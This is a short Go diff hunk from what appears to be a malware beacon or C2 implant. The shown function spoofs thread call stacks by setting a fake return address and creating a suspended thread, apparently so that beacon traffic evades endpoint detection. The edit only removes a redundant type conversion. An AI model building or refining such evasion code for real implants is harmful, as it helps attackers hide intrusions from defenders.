@@ -149,7 +149,7 @@ func spoofBeaconThread(fn func()) {
 	frame[1] = exitAddr
 
 	r, _, _ := beaconSpoofCreate.Call(0, 0, beaconSpoofCB, uintptr(unsafe.Pointer(ctx)), beaconCreateSuspended, 0)
-	hThread := uintptr(r)
+	hThread := r
 	if hThread == 0 {
 		if Debug {
 			fmt.Printf("[spoof] CreateThread failed, beacon send unspoofed\n")
